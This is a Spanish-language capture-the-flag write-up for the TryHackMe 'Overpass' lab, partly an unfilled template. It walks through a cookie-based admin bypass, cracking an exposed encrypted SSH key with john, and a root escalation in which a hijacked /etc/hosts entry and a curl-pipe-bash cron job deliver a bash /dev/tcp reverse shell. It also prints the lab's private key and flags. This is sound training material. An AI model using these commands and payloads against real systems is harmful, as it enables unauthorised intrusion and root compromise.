---
title: Try Hack me- Overpass
date: 2026-11-09
platform: Try Hack Me
difficulty: Easy
os: Linux
tags:
  - John
  - SSH
  - id_rsa
status: ""
---

# Resumen Ejecutivo
**IP Objetivo:** ``
**Descripción breve:** 

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos
```bash

```

**Puertos Abiertos:**
- 22, 80

### Enumeración de Servicios / Fuzzing
```bash

```

**Descubrimientos clave:**
- /admin con un panel de inicio de sesion

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- en el inicio de sesion hay un archivo de login.js que al revisarlo nos damos cuenta que habia un fallo de seguridad con la cookie

```javascript
if (statusOrCookie === "Incorrect credentials") {

        loginStatus.textContent = "Incorrect Credentials"

        passwordBox.value=""

} else {

        Cookies.set("SessionToken",statusOrCookie)

        window.location = "/admin"

}
```

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Creamos una cookie que se llame SessionCookie
2. Al entrar nos deja a la vista una clave RSA y un nombre de usuario 
```text
Welcome to the Overpass Administrator area    A secure password manager with support for Windows, Linux, MacOS and more    

Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.

                Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----

Proc-Type: 4,ENCRYPTED

DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

  

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN

JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal

73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT

WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv

BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ

AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR

3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf

ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk

VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR

OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P

9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze

eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ

4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8

GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn

exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy

AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk

6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58

dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i

n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT

8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K

4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z

ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS

49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2

+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk

2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7

-----END RSA PRIVATE KEY-----
```
1. usamos john the ripper para descifrarla 

### Ejecución
```bash
ssh2john id_rsa > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

chmod 700 id_rsa

ssh -i id_rsa james
```

**Prueba de acceso (User Flag):**
```bash
thm{65c1aaf000506e56996822c6281e6bf7}
```

---

## 4. Privilege Escalation ([[Escaladas de privilegios]])

### Enumeración Interna
- Se revisan las tareas programadas del sistema con:

```bash
cat /etc/crontab
```

- Dentro del archivo aparece una tarea que se ejecuta **cada minuto como `root`**:

```text
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

- El cron descarga un script desde `overpass.thm` y lo ejecuta con `bash`, así que cualquier control sobre ese dominio permite ejecutar código como `root`.
- Se comprueban los permisos de `/etc/hosts`:

```bash
ls -l /etc/hosts
```

```text
-rw-rw-rw- 1 root root ... /etc/hosts
```

- El archivo es escribible por cualquier usuario, por lo que se puede modificar la resolución de `overpass.thm` y apuntarla a la máquina atacante.

### Explotación Local
1. Añadir una entrada en `/etc/hosts` para que `overpass.thm` resuelva a la IP del atacante.
2. Crear en el atacante la ruta `downloads/src/` y colocar dentro `buildscript.sh` con una [[Reverse Shell|reverse shell]].
3. Servir el directorio por HTTP en el puerto 80.
4. Ponerse a la escucha con `netcat` en el puerto `4444`.
5. Esperar a que el cron se ejecute (como máximo un minuto) y recibir la shell como `root`.

### Ejecución
```bash
# En la máquina víctima
echo "TU_IP overpass.thm" >> /etc/hosts
```

```bash
# En la máquina atacante
mkdir -p ~/exploit/downloads/src
nano ~/exploit/downloads/src/buildscript.sh
```

Contenido de `buildscript.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/TU_IP/4444 0>&1
```

```bash
# Servir el script por HTTP
cd ~/exploit
sudo python3 -m http.server 80
```

```bash
# En otra terminal, ponerse a la escucha
nc -lvnp 4444
```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

---

## 5. Post-Exploitation & Clean Up
- [ ] 
- [ ] 
- [ ] 

---

## Remediation (Mitigaciones)
- **Acceso inicial:** 
- **Escalada:**